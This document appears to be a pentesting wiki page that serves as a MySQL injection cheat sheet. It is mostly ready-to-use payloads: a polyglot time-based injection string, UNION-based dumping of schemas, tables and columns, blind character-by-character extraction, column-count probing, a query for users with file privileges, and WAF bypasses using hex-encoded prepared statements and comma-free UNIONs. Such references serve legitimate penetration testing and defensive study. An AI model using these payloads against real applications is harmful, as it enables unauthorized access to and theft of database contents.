---
layout: page
title: MySQL injection
description:
tags:
category: mysql
toc:
  sidebar: left
---

## Comments

```sql
-- MYSQL Comment
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MySQL version 3.23.02
```

## Interesting Functions

<br>

### Confirm Mysql:

```
concat('a','b')
database()
version()
user()
system_user()
@@version
@@datadir
rand()
floor(2.9)
length(1)
count(1)
```

<br>

### Useful functions

```sql
SELECT hex(database())
SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal
SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers
SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers
SELECT replace(database(),"r","R")
SELECT substr(database(),1,1)='r'
SELECT substring(database(),1,1)=0x72
SELECT ascii(substring(database(),1,1))=114
SELECT database()=char(114,101,120,116,101,115,116,101,114)
SELECT group_concat(<COLUMN>) FROM <TABLE>
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()
```

## All injection

```sql
SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"
```

from [https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/](https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/)

## Flow

Remember that in "modern" versions of **MySQL** you can substitute "_**information_schema.tables**_" for "_**mysql.innodb_table_stats**_**"** (This could be useful to bypass WAFs).

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges
```

<br>

### **Only 1 value**

- `group_concat()`
- `Limit X,1`

<br>

### **Blind one by one**

- `substr(version(),X,1)='r'` or `substring(version(),X,1)=0x70` or `ascii(substr(version(),X,1))=112`
- `mid(version(),X,1)='5'`

<br>

### **Blind adding**

- `LPAD(version(),1...lenght(version()),'1')='asd'...`
- `RPAD(version(),1...lenght(version()),'1')='asd'...`
- `SELECT RIGHT(version(),1...lenght(version()))='asd'...`
- `SELECT LEFT(version(),1...lenght(version()))='asd'...`
- `SELECT INSTR('foobarbar', 'fo...')=1`

## Detect number of columns

Using a simple ORDER

```
order by 1
order by 2
order by 3
...
order by XXX

UniOn SeLect 1
UniOn SeLect 1,2
UniOn SeLect 1,2,3
...
```

## MySQL Union Based

```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```

## SSRF

**Learn here different options to** [**abuse a Mysql injection to obtain a SSRF**](mysql-ssrf.md)**.**

## WAF bypass tricks

<br>

### Executing queries through Prepared Statements

When stacked queries are allowed, it might be possible to bypass WAFs by assigning to a variable the hex representation of the query you want to execute (by using SET), and then use the PREPARE and EXECUTE MySQL statements to ultimately execute the query. Something like this:

```
0); SET @query = 0x53454c45435420534c454550283129; PREPARE stmt FROM @query; EXECUTE stmt; #
```

For more information please refer to [this blog post](https://karmainsecurity.com/impresscms-from-unauthenticated-sqli-to-rce).

<br>

### Information_schema alternatives

Remember that in "modern" versions of **MySQL** you can substitute _**information_schema.tables**_ for _**mysql.innodb_table_stats**_ or for _**sys.x$schema_flattened_keys**_ or for **sys.schema_table_statistics**

<br>

### MySQLinjection without COMMAS

Select 2 columns without using any comma ([https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma](https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma)):

```
-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#
```

<br>

### Retrieving values without the column name

If at some point you know the name of the table but you don't know the name of the columns inside the table, you can try to find how may columns are there executing something like:

```bash
# When a True is returned, you have found the number of columns
select (select "", "") = (SELECT * from demo limit 1);     # 2columns
select (select "", "", "") < (SELECT * from demo limit 1); # 3columns
```

Supposing there is 2 columns (being the first one the ID) and the other one the flag, you can try to bruteforce the content of the flag trying character by character:

```bash
# When True, you found the correct char and can start ruteforcing the next position
select (select 1, 'flaf') = (SELECT * from demo limit 1);
```

More info in [https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952](https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952)

<br>

### MySQL history

You ca see other executions inside the MySQL reading the table: **sys.x$statement_analysis**

<br>

### Version alternative**s**

```
mysql> select @@innodb_version;
mysql> select @@version;
mysql> select version();
```

## Other MYSQL injection guides

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)]

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
